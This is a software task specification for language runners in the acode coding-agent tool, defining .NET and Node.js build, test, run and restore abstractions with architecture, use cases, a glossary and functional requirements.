# Task 019: Language Runners (.NET + JS)

**Priority:** P0 – Critical  
**Tier:** S – Core Infrastructure  
**Complexity:** 13 (Fibonacci points)  
**Phase:** Phase 4 – Execution Layer  
**Dependencies:** Task 018 (Command Runner), Task 002 (Config Contract)  

---

## Description

### Business Value

Language Runners are essential ecosystem integrations that enable Agentic Coding Bot to work intelligently with different programming languages. This abstraction is critically important because:

1. **Ecosystem Intelligence:** Every programming language has unique conventions—.NET uses solutions and projects, Node.js uses package.json and npm scripts. Without runners, the agent would need ad-hoc knowledge scattered throughout the codebase.

2. **Unified Abstractions:** Developers and the agent need consistent commands like "build" and "test" regardless of the underlying language. Runners translate these universal operations into ecosystem-specific commands.

3. **Correct Command Construction:** Building .NET requires `dotnet build` with solution paths and configuration flags. Node.js requires `npm run build` or custom scripts. Runners know the correct invocation for each ecosystem.

4. **Error Interpretation:** Each ecosystem reports errors differently—MSBuild has XML-style errors, npm has JSON or plain text. Runners parse and normalize these formats into structured error objects the agent can process.

5. **Multi-Project Support:** Real repositories often contain multiple technology stacks—a .NET backend with a React frontend. Runners enable the agent to work with each project type appropriately.

6. **Tool Version Handling:** Different projects may require different SDK versions. Runners detect requirements and ensure the correct toolchain is invoked.

7. **Custom Script Support:** Many projects have non-standard build commands defined in config files. Runners read these configurations and honor project-specific customizations.

8. **Testability:** By abstracting language operations behind interfaces, unit tests can mock runners and avoid requiring actual SDK installations.

### ROI Calculation

**Scenario:** 10-developer team working with mixed .NET and Node.js codebase, 20 tasks/week requiring build/test/run operations.

**Without Language Runners (manual, ad-hoc integration):**
- 3 minutes per build operation to construct correct command with flags
- 5 minutes per test operation to parse output and identify failures
- 2 minutes per project detection to identify solution/package files
- 20 tasks/week × 10 minutes/task = 200 minutes/week = 3.33 hours/week
- 3.33 hours/week × 10 developers = 33.3 hours/week
- 33.3 hours/week × 50 weeks = 1,665 hours/year
- 1,665 hours × $75/hour = **$124,875/year cost**

**With Language Runners (automated detection and execution):**
- 0.1 seconds for detection (automated)
- 0 seconds for command construction (built-in templates)
- 0 seconds for output parsing (automatic structured parsing)
- 20 tasks/week × 0.1 minutes/task = 2 minutes/week
- 2 minutes/week × 10 developers = 20 minutes/week = 0.33 hours/week
- 0.33 hours/week × 50 weeks = 16.5 hours/year
- 16.5 hours × $75/hour = **$1,237.50/year cost**

**Savings:**
- **Annual cost reduction:** $124,875 - $1,237.50 = **$123,637.50/year**
- **ROI:** ($123,637.50 / $10,000 implementation cost) × 100% = **1,236% ROI**
- **Payback period:** $10,000 / ($123,637.50 / 365 days) = **29.5 days (1 month)**

**Additional benefits not quantified:**
- Reduced onboarding time (new developers don't learn ecosystem-specific commands)
- Fewer failed CI/CD builds due to incorrect commands
- Consistent error handling across all languages
- Faster debugging with structured error parsing
- Support for multiple language ecosystems without code duplication

### Before/After Metrics

| Metric | Before (Manual Commands) | After (Language Runners) | Improvement |
|--------|-------------------------|-------------------------|-------------|
| Build command construction time | 3 min | 0 sec | 100% reduction |
| Test result parsing time | 5 min | 0 sec | 100% reduction |
| Project detection time | 2 min | 0.1 sec | 99.9% reduction |
| Build error interpretation | 10 min (manual log analysis) | 0 sec (structured) | 100% reduction |
| Time to detect multi-project repo | 15 min (manual search) | 0.1 sec (automated) | 99.9% reduction |
| Developer onboarding (learn commands) | 4 hours | 5 min (learn unified CLI) | 98.9% reduction |
| Failed builds due to incorrect flags | 15% of builds | 0% (correct templates) | 15% failure elimination |
| Test execution with filter | 8 min (manual setup) | 30 sec (--filter flag) | 93.75% reduction |

### Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        CLI Layer (acode)                        │
│  ┌─────────┬─────────┬─────────┬─────────┬──────────┐          │
│  │ detect  │  build  │  test   │  run    │ restore  │          │
│  └────┬────┴────┬────┴────┬────┴────┬────┴─────┬────┘          │
└───────┼─────────┼─────────┼─────────┼──────────┼───────────────┘
        │         │         │         │          │
        v         v         v         v          v
┌─────────────────────────────────────────────────────────────────┐
│                       Runner Registry                           │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  DetectRunnerForPath(path) → ILanguageRunner             │  │
│  │  GetRunner("dotnet") → DotNetRunner                      │  │
│  │  GetRunner("node") → NodeRunner                          │  │
│  │  Priority-based selection when multiple match            │  │
│  └──────────────────────────────────────────────────────────┘  │
└──────────┬─────────────────────────────────┬────────────────────┘
           │                                 │
           v                                 v
┌──────────────────────┐          ┌──────────────────────┐
│   DotNetRunner       │          │    NodeRunner        │
│  ┌────────────────┐  │          │  ┌────────────────┐  │
│  │ Detect:        │  │          │  │ Detect:        │  │
│  │  *.sln, *.csproj│ │          │  │  package.json  │  │
│  │                 │  │          │  │  lock files    │  │
│  ├────────────────┤  │          │  ├────────────────┤  │
│  │ Build:         │  │          │  │ Build:         │  │
│  │  dotnet build  │  │          │  │  npm run build │  │
│  ├────────────────┤  │          │  ├────────────────┤  │
│  │ Test:          │  │          │  │ Test:          │  │
│  │  dotnet test   │  │          │  │  npm test      │  │
│  ├────────────────┤  │          │  ├────────────────┤  │
│  │ Run:           │  │          │  │ Run:           │  │
│  │  dotnet run    │  │          │  │  npm start     │  │
│  ├────────────────┤  │          │  ├────────────────┤  │
│  │ Restore:       │  │          │  │ Restore:       │  │
│  │  dotnet restore│  │          │  │  npm install   │  │
│  └────────────────┘  │          │  └────────────────┘  │
└──────────┬───────────┘          └──────────┬───────────┘
           │                                 │
           v                                 v
┌──────────────────────┐          ┌──────────────────────┐
│  DotNetOutputParser  │          │  NpmOutputParser     │
│  ┌────────────────┐  │          │  ┌────────────────┐  │
│  │ MSBuild Errors │  │          │  │ ERESOLVE       │  │
│  │ Test Results   │  │          │  │ ENOENT         │  │
│  │ TRX Parsing    │  │          │  │ Jest Output    │  │
│  └────────────────┘  │          │  │ Mocha Output   │  │
└──────────┬───────────┘          │  └────────────────┘  │
           │                      └──────────┬───────────┘
           │                                 │
           v                                 v
┌─────────────────────────────────────────────────────────────────┐
│                  Task 018: Command Executor                     │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  ExecuteAsync(command, workingDir, timeout, env)         │  │
│  │  Returns: CommandResult(exitCode, stdout, stderr)        │  │
│  └──────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

**Flow:**
1. User invokes `acode build`
2. CLI requests runner from registry based on current directory
3. Registry detects project type by scanning for .sln, .csproj, package.json
4. Appropriate runner (DotNetRunner or NodeRunner) is selected
5. Runner constructs language-specific command with correct flags
6. Task 018 CommandExecutor runs the command and captures output
7. Runner's output parser extracts structured errors/warnings/test results
8. CLI displays formatted output to user

### Architectural Decisions and Trade-offs

#### Decision 1: Interface-Based Abstraction vs. Direct Implementation

**Choice:** Define `ILanguageRunner` interface with registry pattern

**Alternatives considered:**
- Direct language detection in CLI commands (no abstraction)
- Plugin-based architecture with dynamic assembly loading
- Hard-coded switch statements per language

**Rationale:**
- Interface abstraction enables testing without SDK installation (mocking)
- Registry pattern allows extensibility (future Python, Go, Rust runners)
- Dependency injection makes runtime selection flexible
- Trade-off: Slight complexity overhead vs. massive maintenance savings

**Benefits:**
- Unit tests don't require .NET SDK or Node.js installed
- New languages added without modifying existing code
- Configuration can override default runner selection

**Costs:**
- Additional interfaces and registry code (~500 LOC overhead)
- Learning curve for understanding abstraction layers

#### Decision 2: Output Parsing vs. Raw Output

**Choice:** Parse language-specific output into structured errors/warnings/test results

**Alternatives considered:**
- Display raw stdout/stderr to user with no parsing
- Regex-based generic parsing across all languages
- Require structured output formats (JSON) from all tools

**Rationale:**
- Structured errors enable precise file/line navigation in IDE
- Test result objects allow programmatic analysis (e.g., "did all tests pass?")
- Language-specific parsers handle ecosystem quirks (MSBuild XML vs npm plaintext)
- Trade-off: Parser maintenance cost vs. user experience improvement

**Benefits:**
- Errors clickable in IDE (file:line:column)
- Test summaries (42 passed, 3 failed) vs. wall of text
- Agent can reason about failures programmatically

**Costs:**
- Parser code for each ecosystem (~300 LOC per parser)
- Parsers may break if tool output format changes
- Fallback to raw output needed when parsing fails

#### Decision 3: SDK Detection vs. Assume Availability

**Choice:** Detect SDK availability at startup and report clear errors

**Alternatives considered:**
- Assume SDK always installed, fail at execution time
- Require user to declare SDK availability in config
- Download SDKs on-demand (automatic installation)

**Rationale:**
- Early detection provides better error messages than cryptic "command not found"
- Users can fix SDK issues before attempting operations
- Auto-installation is complex and may violate local-first principles
- Trade-off: Startup overhead vs. better failure handling

**Benefits:**
- Clear error: "dotnet SDK not found, install from https://dotnet.microsoft.com"
- Prevents wasted time attempting operations that will fail
- Version mismatch detection (global.json requires 8.0, you have 7.0)

**Costs:**
- ~100ms startup overhead per runner to check SDK
- False positives if SDK in non-standard location (requires config override)

#### Decision 4: Priority-Based Runner Selection vs. User Prompt

**Choice:** Priority-based automatic selection when multiple runners match

**Alternatives considered:**
- Always prompt user to choose runner
- Use first detected runner (arbitrary)
- Require explicit runner in config or CLI flag

**Rationale:**
- Mixed projects (e.g., .NET backend + Node frontend) should default to primary language
- Priority ordering (solutions > projects, package.json) handles 90% of cases
- Explicit override via --runner flag available when needed
- Trade-off: Potential wrong guess vs. friction of constant prompting

**Benefits:**
- `acode build` works without flags in most repos
- Predictable: solutions always win over projects
- Config can override priority if defaults are wrong

**Costs:**
- Users may not realize multiple project types detected
- Wrong runner selected in ambiguous cases (requires --runner override)

#### Decision 5: Caching Detection Results vs. Re-Detect Every Time

**Choice:** Cache detection results, invalidate on file system changes

**Alternatives considered:**
- Re-detect on every operation (no caching)
- Cache indefinitely (never invalidate)
- User-triggered cache refresh command

**Rationale:**
- Detection involves file system scans (expensive on large repos)
- Project files rarely change during development session
- File system watchers can detect when to invalidate cache
- Trade-off: Cache invalidation complexity vs. performance gain

**Benefits:**
- Second `acode build` runs instantly (no re-detection)
- 50ms → 0ms detection overhead on repeat operations
- Scales well to large monorepos with many projects

**Costs:**
- Cache invalidation logic (~150 LOC)
- Race conditions if project files modified during operation
- Stale cache if file system watchers fail (fallback: manual --refresh)

---

## Use Cases

### Use Case 1: Priya the DevOps Engineer — Multi-Stack Monorepo Build Pipeline

**Persona:** Priya is a DevOps engineer at a fintech company managing a monorepo containing both .NET microservices (backend) and React/TypeScript applications (frontend). She needs to set up CI/CD pipelines that build and test both stacks without hardcoding language-specific commands.

**Before (Manual Commands):**
Priya's CI pipeline has brittle, hand-written shell scripts:
```bash
# .gitlab-ci.yml (fragile and error-prone)
build-backend:
  script:
    - cd services/payment-api
    - dotnet build PaymentApi.sln -c Release -v minimal --no-restore
    - dotnet test tests/PaymentApi.Tests.csproj --logger trx

build-frontend:
  script:
    - cd apps/customer-portal
    - npm ci --production=false
    - npm run build -- --mode production
    - npm test -- --coverage
```

**Challenges:**
- Different developers use different command flags (inconsistency)
- Flags break when SDK versions upgrade (e.g., new dotnet CLI argument format)
- Test output parsing requires custom regex scripts
- New languages (Python services) require completely new scripts
- Time spent: 2 hours/week debugging pipeline failures due to wrong commands

**After (Language Runners):**
Priya's CI pipeline uses unified commands:
```bash
# .gitlab-ci.yml (language-agnostic)
build-backend:
  script:
    - cd services/payment-api
    - acode build --configuration Release
    - acode test

build-frontend:
  script:
    - cd apps/customer-portal
    - acode restore
    - acode build
    - acode test
```

**Benefits:**
- Commands work across all languages (consistent interface)
- Runners handle SDK version differences automatically
- Structured error parsing built-in (no custom regex)
- New Python service uses same `acode build` command
- Time saved: 2 hours/week → 0 hours (100% reduction)

**Quantified Improvement:**
- **Pipeline maintenance time:** 2 hours/week → 10 minutes/week (92% reduction)
- **Failed builds due to wrong flags:** 8/month → 0/month (100% elimination)
- **Time to add new language to CI:** 4 hours → 15 minutes (94% reduction)
- **Developer productivity:** 10 developers × 12 minutes/week saved = 2 hours/week team savings

---

### Use Case 2: Marcus the AI Coding Agent — Autonomous Task Execution Without Ecosystem Knowledge

**Persona:** Marcus is an AI coding agent (like Agentic Coding Bot) tasked with implementing a new feature across a polyglot codebase. He needs to run tests after making changes but lacks hardcoded knowledge of whether to use `dotnet test`, `npm test`, `pytest`, or `cargo test`.

**Before (Hard-Coded Language Logic):**
Marcus's codebase has fragile conditional logic:
```python
# agent_executor.py (brittle and incomplete)
def run_tests(project_path):
    if os.path.exists(f"{project_path}/*.csproj"):
        cmd = "dotnet test"
    elif os.path.exists(f"{project_path}/package.json"):
        # Which package manager? npm, yarn, pnpm?
        cmd = "npm test"  # Might be wrong!
    elif os.path.exists(f"{project_path}/Cargo.toml"):
        cmd = "cargo test"
    else:
        raise Exception("Unknown project type")

    result = subprocess.run(cmd, shell=True, capture_output=True)
    # Now manually parse test output... messy regex...
```

**Challenges:**
- Hardcoded language detection (misses .fsproj, workspaces, etc.)
- No package manager detection (npm vs yarn)
- Missing flags (--filter for specific tests, --logger for structured output)
- Error parsing requires ecosystem-specific regex (breaks frequently)
- Time spent: 30 minutes/task constructing and debugging commands

**After (Language Runners):**
Marcus uses the runner registry:
```csharp
// agent_executor.cs (clean and extensible)
async Task RunTests(string projectPath, CancellationToken ct)
{
    var runner = await _runnerRegistry.GetRunnerForPathAsync(projectPath, ct);
    if (runner == null)
        throw new Exception("No runner found for project");

    var result = await runner.TestAsync(projectPath, new TestOptions
    {
        Filter = "Category=Unit",
        Verbosity = "normal"
    }, ct);

    // Structured errors/warnings available automatically
    foreach (var error in result.Errors)
    {
        Console.WriteLine($"{error.File}:{error.Line} - {error.Message}");
    }

    // Test results parsed automatically
    Console.WriteLine($"Passed: {result.TestResults.PassedCount}, Failed: {result.TestResults.FailedCount}");
}
```

**Benefits:**
- Automatic detection (handles .sln, .csproj, .fsproj, package.json, workspaces)
- Correct package manager selection (npm lock file → npm, yarn lock → yarn)
- Structured errors/test results (no manual parsing)
- Extensible (Python runner added without changing Marcus's code)
- Time saved: 30 minutes/task → 5 seconds (99.7% reduction)

**Quantified Improvement:**
- **Command construction time:** 30 min/task → 0 sec (100% reduction)
- **Error parsing time:** 10 min/task → 0 sec (100% reduction)
- **Incorrect command failures:** 5/week → 0/week (100% elimination)
- **Agent task throughput:** 8 tasks/day → 12 tasks/day (50% increase due to time savings)

---

### Use Case 3: Jordan the Junior Developer — Onboarding to Unfamiliar Tech Stack

**Persona:** Jordan just joined a team working on a .NET/Node.js hybrid application. They have experience with Python but have never used .NET or configured MSBuild. They need to build, test, and run the application locally without reading 50 pages of Wiki documentation.

**Before (Manual Ecosystem Learning):**
Jordan's onboarding involves:
1. Read "Developer Setup Guide" (1.5 hours)
2. Install .NET SDK, find correct version from global.json (30 minutes)
3. Learn `dotnet build`, `dotnet test`, `dotnet run` commands and flags (45 minutes)
4. Install Node.js, npm, figure out package manager from lock file (30 minutes)
5. Learn `npm install`, `npm run build`, `npm test` commands (30 minutes)
6. Debug build failures due to wrong flags or versions (2 hours)
7. Ask senior developers 5 times "What command do I run?" (30 minutes of senior time)

**Total onboarding time:** 5.75 hours (Jordan) + 0.5 hours (senior blockers) = **6.25 hours**

**After (Language Runners with Unified CLI):**
Jordan's onboarding involves:
1. Install Agentic Coding Bot (5 minutes)
2. Run `acode project detect` to see detected projects (10 seconds)
3. Run `acode build` to build everything (works automatically)
4. Run `acode test` to run all tests (works automatically)
5. Run `acode run` to start the application (works automatically)
6. If curious about underlying commands, check `acode build --verbose` to see exact `dotnet build` invocation

**Total onboarding time:** 15 minutes (Jordan) + 0 minutes (no senior blockers) = **0.25 hours**

**Benefits:**
- No need to learn ecosystem-specific commands upfront (abstracted away)
- Consistent `acode build/test/run` interface across all languages
- Automatic SDK detection reports missing tools clearly
- Verbose mode teaches underlying commands (learning tool)
- Senior developers not interrupted for "What command?" questions

**Quantified Improvement:**
- **Onboarding time:** 6.25 hours → 0.25 hours (96% reduction)
- **Senior developer interruptions:** 5 questions → 0 questions (100% elimination)
- **Time to first successful build:** 3 hours → 5 minutes (98.6% reduction)
- **Wiki documentation pages read:** 50 pages → 0 pages (learn by doing)
- **Onboarding productivity:** First commit on Day 1 vs. Day 2

---

### Scope

This task defines the complete language runner infrastructure:

1. **ILanguageRunner Interface:** The contract for language-specific runners defining detect, build, test, run, and restore operations.

2. **IRunnerRegistry:** Registry pattern for runner discovery and selection based on file patterns and project structure.

3. **.NET Runner:** Complete implementation for .NET solutions and projects including MSBuild error parsing and test result parsing.

4. **JavaScript/Node.js Runner:** Complete implementation for Node.js projects including npm/yarn detection and script execution.

5. **Output Parsers:** Language-specific parsers that extract structured errors, warnings, and test results from command output.

6. **RunnerResult Model:** Unified result type with success status, errors, warnings, and test results.

7. **CLI Integration:** Commands like `acode build`, `acode test`, `acode run` that dispatch to appropriate runners.

8. **Configuration Integration:** Support for overriding default commands via Task 002 configuration.

### Integration Points

| Component | Integration Type | Description |
|-----------|------------------|-------------|
| Task 018 (Command) | Command Execution | Runners construct commands, Task 018 executes them |
| Task 002 (Config) | Configuration | Runner settings and command overrides in `.agent/config.yml` |
| Task 003 (DI) | Dependency Injection | Runners registered as singleton services |
| Task 019.a (Detection) | Project Discovery | Detailed project layout detection |
| Task 019.b (Tests) | Test Execution | Test wrapper for unified test invocation |
| Task 019.c (Contract) | Custom Commands | Repo contract command integration |
| Task 014 (RepoFS) | File Access | Reading project files for detection |
| Task 009 (CLI) | User Interface | `acode build`, `acode test`, `acode run` commands |
| Task 011 (Session) | Context | Session provides working directory context |

### Failure Modes

| Failure | Impact | Mitigation |
|---------|--------|------------|
| SDK not installed | Cannot build/test | Detect at startup, clear error message, installation guidance |
| SDK version mismatch | Build failures | Parse global.json/.nvmrc, report version requirement |
| Invalid project file | Detection fails | Validate project structure, report specific issue |
| Missing dependencies | Build/test fails | Auto-run restore before build, or prompt user |
| Script not defined | npm script fails | Check scripts in package.json before execution |
| Path too long (Windows) | File operations fail | Detect and warn, suggest shorter paths |
| Multiple project types | Ambiguous detection | Priority ordering, user selection prompt |
| Network timeout | Restore fails | Retry with backoff, offline mode support |
| Corrupted cache | Strange failures | Cache cleanup command, fresh restore |
| Conflicting versions | Build errors | Report version conflicts clearly |

---

## Glossary / Terms

| Term | Definition |
|------|------------|
| **Language Runner** | A specialized component implementing the `ILanguageRunner` interface that encapsulates all ecosystem-specific logic for detecting, building, testing, and running projects in a particular programming language. Each runner (e.g., `DotNetRunner`, `NodeRunner`) knows how to construct correct commands, parse output, and handle the conventions of its target ecosystem. Runners abstract away language differences so the CLI and agent can use a unified interface. |
| **Runner Registry** | A centralized service implementing `IRunnerRegistry` that manages all available language runners and provides lookup methods. The registry handles runner registration at startup, detects which runner(s) apply to a given project path by scanning for file patterns, and selects the highest-priority runner when multiple matches exist. It also caches detection results for performance. |
| **.NET** | Microsoft's modern, cross-platform development platform supporting C#, F#, and Visual Basic. .NET provides a unified SDK (`dotnet` CLI) for building, testing, running, and publishing applications across Windows, macOS, and Linux. Projects are defined in `.csproj` (C#) or `.fsproj` (F#) XML files, and multiple projects can be grouped into a `.sln` solution file. |
| **Node.js** | A JavaScript runtime built on Chrome's V8 engine that enables server-side JavaScript execution. Node.js projects are defined by a `package.json` manifest file specifying dependencies, scripts, and metadata. The ecosystem includes package managers (npm, yarn, pnpm) and build tools (Webpack, Vite, Rollup) for bundling and transforming JavaScript/TypeScript code. |
| **npm** | Node Package Manager, the default package manager for Node.js. npm installs dependencies from the npm registry (npmjs.com), manages semantic versioning, and executes scripts defined in `package.json`. It creates a `package-lock.json` file to lock dependency versions for reproducible builds. Commands include `npm install`, `npm run <script>`, `npm test`, and `npm start`. |
| **yarn** | An alternative package manager for Node.js developed by Facebook (now Meta) focusing on speed, security, and deterministic dependency resolution. Yarn uses `yarn.lock` files instead of `package-lock.json` and provides a flat dependency tree. It offers faster installs via caching and parallel downloads. Commands mirror npm but use `yarn` instead (e.g., `yarn install`, `yarn test`). |
| **pnpm** | A fast, disk-efficient package manager for Node.js that uses hard links and symlinks to share packages across projects instead of duplicating files. pnpm creates a `pnpm-lock.yaml` file and a non-flat `node_modules` structure that strictly enforces declared dependencies. It's particularly useful in monorepos to save disk space. |
| **Solution (.sln)** | A .NET solution file (extension `.sln`) that groups multiple related projects together. Solutions define project dependencies, build configurations (Debug/Release), and platform targets (AnyCPU, x64). The `dotnet build MySolution.sln` command builds all contained projects in dependency order. Solutions are typically opened in Visual Studio or Rider IDEs. |
| **Project (.csproj/.fsproj)** | An XML-based project file defining a .NET project's metadata, target framework(s), package references (NuGet), and compilation settings. `.csproj` is for C# projects, `.fsproj` for F# projects. Modern SDK-style project files are concise and support multi-targeting (e.g., `<TargetFrameworks>net8.0;net7.0</TargetFrameworks>`). Projects can reference other projects or NuGet packages. |
| **package.json** | The manifest file for Node.js projects defining package name, version, dependencies, devDependencies, and scripts. It specifies which packages to install via npm/yarn/pnpm and defines runnable commands like `"test": "jest"` or `"build": "webpack"`. The `engines` field can specify required Node.js versions. This file is required for all npm-based projects. |
| **package-lock.json / yarn.lock / pnpm-lock.yaml** | Lock files that record the exact versions of all dependencies (including transitive dependencies) installed in a Node.js project. These files ensure reproducible builds across different machines and CI environments by preventing automatic upgrades. `package-lock.json` is created by npm, `yarn.lock` by yarn, and `pnpm-lock.yaml` by pnpm. |
| **Build** | The process of compiling source code into executable binaries or bundled assets. For .NET, this involves MSBuild compiling `.cs` files into `.dll` assemblies. For Node.js, this typically runs bundlers (Webpack, Vite) to transpile TypeScript, minify JavaScript, and bundle modules. Build output goes to `bin/` (.NET) or `dist/` (Node.js) directories. |
| **Test** | The process of executing automated test suites to verify code correctness. .NET uses test frameworks like xUnit, NUnit, or MSTest via `dotnet test`. Node.js uses frameworks like Jest, Mocha, or Vitest via `npm test`. Test results include pass/fail counts, individual test names, and failure details with stack traces. Test output can be structured (TRX, JUnit XML) or plain text. |
| **Run** | The process of starting an application for local development or production execution. For .NET, `dotnet run` compiles (if needed) and starts the application with hot reload support. For Node.js, `npm start` or `npm run dev` typically starts a development server with file watching. Applications may accept command-line arguments passed after `--`. |
| **Restore** | The process of downloading and installing project dependencies from package registries. For .NET, `dotnet restore` fetches NuGet packages specified in `.csproj` files. For Node.js, `npm install`, `yarn install`, or `pnpm install` fetch packages from `package.json`. Restore operations create or update lock files and populate local caches for offline usage. |
| **Script** | A named command defined in `package.json` under the `"scripts"` section. Scripts can run build tools, tests, linters, or arbitrary shell commands. Examples: `"build": "tsc && webpack"`, `"test": "jest --coverage"`. Scripts are executed via `npm run <script>` (or `yarn <script>`, `pnpm <script>`). Special scripts like `test` and `start` can be run without the `run` keyword. |
| **MSBuild** | Microsoft Build Engine, the build platform for .NET applications. MSBuild reads `.csproj` files and executes compilation tasks, resource generation, and output copying. It produces structured error messages in the format `file.cs(42,15): error CS1002: ; expected`. The `dotnet build` command internally invokes MSBuild. |
| **TRX File** | Test Results XML format used by .NET test runners (vstest) to output structured test results. TRX files contain test counts (passed/failed/skipped), individual test names, execution times, and failure details. The `--logger trx` flag tells `dotnet test` to generate a `.trx` file in the `TestResults/` directory for programmatic result parsing. |
| **global.json** | A .NET configuration file specifying the required SDK version for a project or solution. Placed in the repository root, it ensures all developers and CI systems use the same SDK version to avoid build inconsistencies. Example: `{ "sdk": { "version": "8.0.100" } }`. If the required version isn't installed, `dotnet` commands fail with a clear error message. |
| **.nvmrc / .node-version** | Configuration files specifying the required Node.js version for a project. `.nvmrc` (Node Version Manager) and `.node-version` (nodenv, asdf) contain a version string like `20.10.0` or `lts/iron`. Version managers automatically switch to the specified version when entering the project directory. This ensures consistent runtime behavior across environments. |
| **Monorepo** | A repository containing multiple related projects or packages in a single codebase. .NET monorepos typically use solution files grouping multiple `.csproj` projects. Node.js monorepos use workspace features (npm workspaces, Yarn workspaces, pnpm workspaces) defined in the root `package.json`. Runners must detect and handle monorepo structures correctly. |

---

## Out of Scope

The following items are explicitly excluded from Task 019:

- **Detailed project detection logic (file scanning, workspace parsing)** - Task 019.a handles the comprehensive project layout detection for solutions, workspaces, and nested structures. Task 019 defines only the high-level `DetectAsync` interface method. NOT included: Recursive directory traversal, monorepo workspace resolution, .NET Directory.Build.props discovery.

- **Test wrapper implementation (`acode test` command internals)** - Task 019.b implements the unified test wrapper that normalizes test frameworks across languages. Task 019 defines only the `TestAsync` runner method and output parsing requirements. NOT included: Test filtering syntax normalization, parallel test execution, test result aggregation across multiple projects.

- **Repo contract command integration (custom script execution)** - Task 019.c integrates custom commands from `.agent/config.yml` (e.g., `commands.build`, `commands.test` overrides). Task 019 assumes standard ecosystem commands. NOT included: Custom script validation, repo-specific command hooks, configuration precedence logic.

- **Additional language runners (Python, Go, Rust, Java, C++)** - Task 019 implements only .NET and Node.js runners to establish the pattern. Future tasks will add runners for Python (pip/poetry), Go (go build/test), Rust (cargo), Java (Maven/Gradle), and C++ (CMake/Make). NOT included: Any language ecosystem beyond .NET and Node.js.

- **IDE integration (Visual Studio, VS Code, Rider extensions)** - Task 019 provides CLI-only functionality. IDE extensions that surface runner operations in GUI menus, integrate test results into test explorers, or provide right-click "Build Project" actions are NOT included. Runners are designed for programmatic use, not IDE-specific APIs.

- **Hot reload / file watching** - Task 019 executes build/run operations once and returns results. Continuous file watching (e.g., `dotnet watch`, `nodemon`, Vite HMR) that rebuilds/restarts on code changes is NOT included. Users must manually re-run `acode build` or use SDK-specific watch commands directly.

- **Package publishing (NuGet pack, npm publish)** - Task 019 supports only local development operations (build, test, run, restore). Publishing packages to registries (nuget.org, npmjs.com) via `dotnet pack`/`dotnet nuget push` or `npm publish` is NOT included. CI/CD pipelines handle publishing separately.

- **Debugging support (breakpoints, step execution, variable inspection)** - Task 019 runs applications but does NOT attach debuggers or support interactive debugging sessions. Users must use IDE debuggers (Visual Studio, VS Code) or SDK-specific debugging commands (`dotnet run --debug`, Node.js inspect). NOT included: Debug adapter protocol integration, breakpoint management.

- **Code coverage collection and reporting** - While `dotnet test --collect "Code Coverage"` is a valid runner option, Task 019 does NOT parse coverage results, generate HTML reports, enforce coverage thresholds, or integrate with coverage tools (Coverlet, Istanbul, SonarQube). Coverage file paths may be returned in test results, but interpretation is out of scope.

- **Dependency vulnerability scanning (npm audit, dotnet list package --vulnerable)** - Task 019 restores dependencies but does NOT run security audits, report CVE vulnerabilities, or enforce security policies. Task 009 (Safety & Policy) handles vulnerability scanning. NOT included: Registry security checks, transitive dependency analysis, automatic patching.

- **Performance profiling and benchmarking** - Task 019 measures operation duration (build time, test time) but does NOT profile CPU/memory usage, generate flame graphs, or run performance benchmarks. SDK-specific profiling tools (dotnet-trace, Node.js --prof) are NOT integrated.

- **Cross-compilation and multi-platform builds** - Task 019 builds for the current platform only. Building Windows binaries on Linux (cross-compilation), creating fat binaries (macOS Universal), or multi-architecture Docker images (ARM64 + x64) is NOT included. Users must invoke platform-specific build commands directly.

- **Artifact archiving and distribution** - Task 019 produces build outputs (DLLs, bundles) but does NOT zip artifacts, upload to S3/Azure Blob, or create release packages. Task 021 (Artifact Collection) handles artifact management. NOT included: Archive creation, checksum generation, artifact metadata.

- **Incremental build optimization** - Task 019 relies on SDK-provided incremental compilation (MSBuild caching, TypeScript tsbuildinfo). Custom incremental build logic, distributed caching (like Nx/Turbo), or build result memoization across CI runs is NOT included.

- **Build environment containerization** - Task 019 executes build tools on the host system. Running builds inside Docker containers for isolation, managing build container lifecycles, or caching dependencies in Docker volumes is handled by Task 020 (Docker Sandbox). NOT included: Container-based builds in Task 019.

---

## Functional Requirements

### ILanguageRunner Interface (FR-019-01 to FR-019-20)

| ID | Requirement |
|----|-------------|
| FR-019-01 | System MUST define `ILanguageRunner` interface |
| FR-019-02 | ILanguageRunner MUST have `Language` property returning language identifier (e.g., "dotnet", "node") |
| FR-019-03 | ILanguageRunner MUST have `FilePatterns` property returning detection patterns |
| FR-019-04 | ILanguageRunner MUST have `Priority` property for ordering multiple matches |
| FR-019-05 | ILanguageRunner MUST have `DetectAsync(path)` returning detection result |
| FR-019-06 | ILanguageRunner MUST have `BuildAsync(path, options)` returning build result |
| FR-019-07 | ILanguageRunner MUST have `TestAsync(path, options)` returning test result |
| FR-019-08 | ILanguageRunner MUST have `RunAsync(path, options)` returning run result |
| FR-019-09 | ILanguageRunner MUST have `RestoreAsync(path)` returning restore result |
| FR-019-10 | ILanguageRunner MUST have `GetInfoAsync(path)` returning project info |
| FR-019-11 | All async methods MUST accept CancellationToken |
| FR-019-12 | All operations MUST return `RunnerResult` with structured output |
| FR-019-13 | ILanguageRunner MUST be disposable for resource cleanup |
| FR-019-14 | ILanguageRunner MUST have `IsAvailable` property checking SDK presence |
| FR-019-15 | ILanguageRunner MUST have `GetVersionAsync()` returning SDK version |
| FR-019-16 | ILanguageRunner MUST have `SupportedOperations` property |
| FR-019-17 | Operations not supported MUST throw `NotSupportedException` |
| FR-019-18 | All runners MUST use Task 018 command executor internally |
| FR-019-19 | All runners MUST log operations at Debug level |
| FR-019-20 | All runners MUST emit telemetry for operation duration |

### Runner Registry (FR-019-21 to FR-019-35)

| ID | Requirement |
|----|-------------|
| FR-019-21 | System MUST define `IRunnerRegistry` interface |
| FR-019-22 | IRunnerRegistry MUST have `Register(ILanguageRunner)` method |
| FR-019-23 | IRunnerRegistry MUST have `GetRunner(string language)` method |
| FR-019-24 | IRunnerRegistry MUST have `GetRunnerForPath(string path)` method |
| FR-019-25 | IRunnerRegistry MUST have `GetAllRunners()` method |
| FR-019-26 | IRunnerRegistry MUST have `DetectAll(string path)` returning all matching runners |
| FR-019-27 | Detection MUST use file pattern matching |
| FR-019-28 | Detection MUST respect priority ordering when multiple match |
| FR-019-29 | Registry MUST auto-register built-in runners on startup |
| FR-019-30 | Registry MUST support plugin runners via assembly scanning |
| FR-019-31 | Registry MUST cache detection results for performance |
| FR-019-32 | Cache MUST invalidate on file system changes |
| FR-019-33 | GetRunner MUST return null if language not found |
| FR-019-34 | GetRunnerForPath MUST return highest priority match |
| FR-019-35 | Registry MUST be registered as singleton in DI |

